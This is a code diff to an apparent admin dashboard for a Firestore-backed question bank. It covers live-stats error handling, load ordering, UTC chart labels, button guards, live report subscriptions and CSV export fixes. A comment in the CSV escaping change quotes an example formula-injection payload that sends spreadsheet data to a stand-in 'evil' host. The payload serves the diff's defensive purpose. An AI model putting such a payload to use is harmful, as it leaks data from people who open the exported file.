@@ -1550,6 +1550,14 @@
           <!-- TAB: Dashboard (existing content) -->
           <div class="admin-tab-panel active" id="adminTabDashboard">
 
+          <!-- Shown when the live Firestore user stream errors out. Hidden
+               again automatically the next time the stream ticks OK. -->
+          <div id="adminStatsErrorBanner" role="status"
+               style="display:none; background:#FEF3C7; color:#78350F;
+                      border:1px solid #F59E0B; border-radius:10px;
+                      padding:10px 14px; margin-bottom:14px; font-size:0.92rem;">
+          </div>
+
           <!-- Quick Stats Cards -->
           <div class="admin-stats-grid" id="adminStatsGrid">
             <div class="admin-stat-card">
@@ -3793,7 +3801,7 @@
   <!-- Chart.js for admin "Site Activity" charts. Loaded async so it doesn't
        block other dashboard rendering for non-admin users. -->
   <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
-  <script src="auth.js?v=20260713-xss"></script>
+  <script src="auth.js?v=20260714-admin"></script>
   <script src="contact-booking.js?v=20260511-charts"></script>
   <script>
     let currentProfile = null;
@@ -5642,12 +5650,17 @@
       // loadAdminUsers must finish BEFORE loadQuestionReports starts so the
       // reports panel can look up reporter emails from the merged user cache
       // (allAdminUsers includes Auth emails, not just Firestore profile
-      // emails — older accounts often lack the latter). The other two
-      // panels are independent and run in parallel.
+      // emails — older accounts often lack the latter). loadRecentActivity
+      // ALSO depends on the merged user list — it reads each user's qbank
+      // history subcollection to build the "Recent Tests" panel. Running
+      // it before the users load leaves that panel permanently empty.
+      // loadAdminStats is independent and safe to start in parallel; its
+      // internal `authReady` gate holds the tiles at "-" until the user
+      // list arrives, so no flicker.
       const usersPromise = loadAdminUsers();
-      const otherPromise = Promise.all([loadAdminStats(), loadRecentActivity()]);
+      const statsPromise = loadAdminStats();
       await usersPromise;
-      await Promise.all([loadQuestionReports(), otherPromise]);
+      await Promise.all([loadRecentActivity(), loadQuestionReports(), statsPromise]);
     }
 
     // ===== Admin Stats (real-time via onSnapshot) =====
@@ -5760,7 +5773,14 @@
           }
         });
 
-        document.getElementById('adminStatTotalUsers').textContent = users.length;
+        // Total Users = merged Auth+Firestore set (matches the table row
+        // count exactly). Intersecting with Firestore would omit Auth-only
+        // accounts whose profile doc failed to land on signup — those
+        // users are real and admin can see them in the table, so they
+        // count. `paidUsers` / `newThisMonth` still derive from the
+        // intersection because those metrics require Firestore fields
+        // (`payments`, `createdAt`) that Auth-only accounts don't have.
+        document.getElementById('adminStatTotalUsers').textContent = allAdminUsers.length;
         document.getElementById('adminStatNewUsers').textContent = newThisMonth;
         document.getElementById('adminStatPaidUsers').textContent = paidUsers;
         document.getElementById('adminStatRevenue').textContent = '$' + totalRevenue.toLocaleString();
@@ -5792,12 +5812,24 @@
         // render (vs. the initial "both data sources unloaded" state
         // where the tiles must stay at their "-" placeholder).
         window._firestoreUsersLoaded = true;
+        // Hide any prior "stats disconnected" banner — data is flowing.
+        const errBanner = document.getElementById('adminStatsErrorBanner');
+        if (errBanner) errBanner.style.display = 'none';
         recomputeAdminStats();
         // If the user count changed (new signup / deletion), re-fetch
         // the table data via the Cloud Function so the table stays in
         // sync with the new state.
         if (users.length !== prevCount && prevCount > 0) {
           scheduleUserListRefresh();
+        }
+      }, err => {
+        // Live stream broke (rules changed, token expired, network
+        // partition). Surface it — without this the tiles quietly
+        // freeze on their last known values and the admin has no idea.
+        const errBanner = document.getElementById('adminStatsErrorBanner');
+        if (errBanner) {
+          errBanner.style.display = '';
+          errBanner.textContent = 'Live stats disconnected (' + (err && err.code || 'unknown') + '). Numbers below may be stale until you refresh.';
         }
       });
 
@@ -5809,17 +5841,21 @@
         if (el) el.textContent = count.toLocaleString();
       });
 
-      // Daily visits → live map of YYYY-MM-DD → count
+      // Daily visits → live map of YYYY-MM-DD → count. Skip cached
+      // snapshots so we don't render the chart twice (cache tick, then
+      // server tick) on every re-subscribe — visible as a brief flicker.
       adminVisitsByDayUnsub = db.collection('_meta').doc('visitsByDay')
         .onSnapshot(doc => {
+          if (doc.metadata && doc.metadata.fromCache) return;
           const data = doc.data() || {};
           visitsByDayCache = data.days || {};
           renderVisitsDailyChart();
         }, err => console.warn('visitsByDay listener:', err.message));
 
-      // Per-country visits → live map of CC → count
+      // Per-country visits → live map of CC → count.
       adminVisitsByCountryUnsub = db.collection('_meta').doc('visitsByCountry')
         .onSnapshot(doc => {
+          if (doc.metadata && doc.metadata.fromCache) return;
           const data = doc.data() || {};
           visitsByCountryCache = data.countries || {};
           renderVisitsCountryChart();
@@ -5864,6 +5900,9 @@
 
       // Build the labels (oldest → newest) and values arrays. Days with no
       // recorded visits show as 0 so the line is continuous.
+      // IMPORTANT: keys are UTC ISO dates (auth.js writes them that way).
+      // Labels must also render in UTC or admins west of UTC (EDT/EST/PST)
+      // see today's visits shown under yesterday's date after ~8 pm local.
       const today = new Date();
       const labels = [];
       const values = [];
@@ -5872,7 +5911,7 @@
         const d = new Date(today);
         d.setUTCDate(today.getUTCDate() - i);
         const key = d.toISOString().slice(0, 10);
-        labels.push(d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }));
+        labels.push(d.toLocaleDateString('en-US', { month: 'short', day: 'numeric', timeZone: 'UTC' }));
         const n = visitsByDayCache[key] || 0;
         values.push(n);
         total += n;
@@ -5990,21 +6029,16 @@
       const loadingEl = document.getElementById('adminUsersLoading');
       const tableEl = document.getElementById('adminUsersTable');
 
-      // Race fix: the per-user visit increment from auth.js fires roughly
-      // at the same time as this function. If the Cloud Function's
-      // server-side read of /users/{uid} happens BEFORE the write commits,
-      // the admin's own row shows visitCount = (old value), making it
-      // look like the visit wasn't recorded. Awaiting the in-flight visit
-      // promise (with a short timeout so a slow write doesn't block the
-      // table forever) guarantees the read sees the post-increment value.
-      if (window.__shosVisitPromise) {
-        try {
-          await Promise.race([
-            window.__shosVisitPromise,
-            new Promise(res => setTimeout(res, 2500)),
-          ]);
-        } catch (_) { /* visit promise rejected — already logged in [visit] */ }
-      }
+      // Formerly waited up to 2.5s on the admin's own visit-count write
+      // to settle before firing the CF read. That was the direct cause
+      // of the "dashboard shows stale data for 2 seconds" complaint —
+      // the ENTIRE admin panel (stats tiles too, because they gate on
+      // this function's result) held for that full window.
+      //
+      // We now fire the CF immediately. If the admin's own row shows a
+      // stale visitCount, the live Firestore subscription in loadAdminStats
+      // will push the corrected value within a second — no need to block
+      // the entire admin experience on it.
 
       let users = null;
       let source = null;
@@ -6286,7 +6320,22 @@
 
     async function toggleQBankAccess(uid, currentlyPaid) {
       const action = currentlyPaid ? 'revoke' : 'grant';
+
+      // Double-click guard: locate the button that triggered this call
+      // via event.currentTarget won't work (inline onclick), so use the
+      // row's toggle button by uid. If it's already disabled, bail.
+      const row = document.querySelector('tr[data-uid="' + uid + '"]');
+      const btn = row ? row.querySelector('.admin-btn-grant, .admin-btn-revoke') : null;
+      if (btn && btn.dataset.busy === '1') return;
+
       if (!confirm(`Are you sure you want to ${action} QBank access for this user?`)) return;
+
+      if (btn) {
+        btn.dataset.busy = '1';
+        btn.disabled = true;
+        btn.dataset.origLabel = btn.textContent;
+        btn.textContent = currentlyPaid ? 'Revoking…' : 'Granting…';
+      }
 
       // Find the row in our local cache so we can attach name/email
       // when the Firestore doc is being created for the first time
@@ -6357,14 +6406,33 @@
         });
         renderAdminUsersPage();
 
-        // Refresh stats
-        adminDataLoaded = false;
-        loadAdminStats();
-        adminDataLoaded = true;
+        // Stats refresh: no explicit re-subscribe needed. The live
+        // `subscribeAllUsers` stream is already attached from the initial
+        // `loadAdminStats()` call and will push the updated `payments`
+        // field on this user within one Firestore tick, triggering
+        // `recomputeAdminStats()` automatically. Calling `loadAdminStats()`
+        // here would tear down + recreate 4 listeners, re-render both
+        // charts, and cause visible flicker — for no gain.
+        if (typeof window.recomputeAdminStats === 'function') {
+          window.recomputeAdminStats();
+        }
 
       } catch (err) {
         console.error('Failed to toggle QBank access:', err);
         alert('Failed to update access: ' + err.message);
+      } finally {
+        // Restore the button (label + enabled state) regardless of
+        // success/failure. renderAdminUsersPage() typically replaces
+        // the button element outright on success — this cleanup only
+        // matters on the error path where the row survives.
+        if (btn) {
+          btn.disabled = false;
+          delete btn.dataset.busy;
+          if (btn.dataset.origLabel) {
+            btn.textContent = btn.dataset.origLabel;
+            delete btn.dataset.origLabel;
+          }
+        }
       }
     }
 
@@ -6383,7 +6451,7 @@
       const detailsRow = document.createElement('tr');
       detailsRow.className = 'admin-details-row';
       const td = document.createElement('td');
-      td.colSpan = 6;
+      td.colSpan = 7;
       td.className = 'admin-user-details';
 
       // Resolve a human-readable path label, accounting for admin /
@@ -6470,9 +6538,16 @@
           if (u) u.path = path;
         }
         // Re-render the affected row + re-open the details panel so the
-        // admin sees the new state immediately.
+        // admin sees the new state immediately. The real function name
+        // is `toggleUserDetails` — a prior misnamed call (`toggleAdminDetails`)
+        // silently no-op'd and left the details closed after each Set-Path.
         if (typeof renderAdminUsersPage === 'function') renderAdminUsersPage();
-        setTimeout(() => { if (typeof toggleAdminDetails === 'function') toggleAdminDetails(uid); }, 60);
+        setTimeout(() => {
+          if (typeof toggleUserDetails === 'function') {
+            const btn = document.querySelector('tr[data-uid="' + uid + '"] .admin-btn-details');
+            toggleUserDetails(uid, btn);
+          }
+        }, 60);
       } catch (err) {
         console.error('adminSetUserPath failed:', err);
         alert('Failed to update path: ' + (err && err.message));
@@ -6618,15 +6693,47 @@
       }
     }
 
-    async function loadQuestionReports() {
+    // Live-subscribed. Set up once; every write (new report / resolve /
+    // delete) triggers a re-render automatically. Previously a one-shot
+    // `.get()` meant admins had to reload the page to see newly-filed
+    // reports.
+    let _questionReportsUnsub = null;
+    function loadQuestionReports() {
       const loadingEl = document.getElementById('adminReportsLoading');
       const listEl = document.getElementById('adminReportsList');
       const emptyEl = document.getElementById('adminReportsEmpty');
 
-      try {
-        const reportsSnap = await db.collection('questionReports')
-          .orderBy('createdAt', 'desc').get();
+      // Tear down any prior subscription (idempotent on re-entry).
+      if (typeof _questionReportsUnsub === 'function') {
+        _questionReportsUnsub();
+        _questionReportsUnsub = null;
+      }
 
+      return new Promise((resolve) => {
+        let firstResolve = resolve;
+        _questionReportsUnsub = db.collection('questionReports')
+          .orderBy('createdAt', 'desc')
+          .onSnapshot(async reportsSnap => {
+            try {
+              await renderQuestionReports(reportsSnap, listEl, emptyEl, loadingEl);
+            } catch (err) {
+              console.error('renderQuestionReports failed:', err);
+            }
+            if (firstResolve) { firstResolve(); firstResolve = null; }
+          }, err => {
+            console.error('questionReports subscribe error:', err);
+            loadingEl.textContent = 'Could not load reports (' + (err.code || 'error') + ').';
+            if (firstResolve) { firstResolve(); firstResolve = null; }
+          });
+      });
+    }
+
+    async function renderQuestionReports(reportsSnap, listEl, emptyEl, loadingEl) {
+      try {
+        // Reset render surfaces on every snapshot tick so removed reports
+        // actually disappear (previous render's DOM would otherwise linger).
+        listEl.innerHTML = '';
+        emptyEl.style.display = 'none';
         loadingEl.style.display = 'none';
 
         if (reportsSnap.empty) {
@@ -6787,18 +6894,18 @@
 
     async function resolveReport(reportId) {
       if (!confirm('Mark this report as resolved?')) return;
+      const btn = document.querySelector('#report-' + reportId + ' .admin-resolve-btn');
+      if (btn) { btn.disabled = true; btn.textContent = 'Resolving…'; }
       try {
         await db.collection('questionReports').doc(reportId).update({ resolved: true });
-        const el = document.getElementById('report-' + reportId);
-        if (el) el.remove();
-        // Check if any reports remain
-        const remaining = document.querySelectorAll('.admin-report-card');
-        if (remaining.length === 0) {
-          document.getElementById('adminReportsEmpty').style.display = 'block';
-        }
+        // No manual DOM removal here — the live onSnapshot listener set
+        // up by loadQuestionReports() re-renders the whole panel on the
+        // next tick (and drops resolved rows via the `if (r.resolved) return;`
+        // filter inside renderQuestionReports).
       } catch (err) {
         console.error('Failed to resolve report:', err);
         alert('Failed to resolve: ' + err.message);
+        if (btn) { btn.disabled = false; btn.textContent = 'Resolve'; }
       }
     }
 
@@ -7222,10 +7329,17 @@
       }
 
       // CSV escape: wrap in double-quotes, double-up internal quotes,
-      // strip newlines so a single user row stays on one line.
+      // strip newlines so a single user row stays on one line. Also
+      // DEFUSE Excel/Sheets formula injection: any cell that begins with
+      // `=`, `+`, `-`, `@`, tab, or CR is prefixed with a single quote
+      // so Excel treats it as literal text instead of a formula. A user
+      // whose display name is `=HYPERLINK("http://evil/steal?u="&A2)`
+      // would otherwise execute when the admin opens the exported file.
       function csv(v) {
         if (v === null || v === undefined) return '';
-        const s = String(v).replace(/"/g, '""').replace(/\r?\n/g, ' ');
+        let s = String(v).replace(/\r?\n/g, ' ');
+        if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+        s = s.replace(/"/g, '""');
         return '"' + s + '"';
       }
 
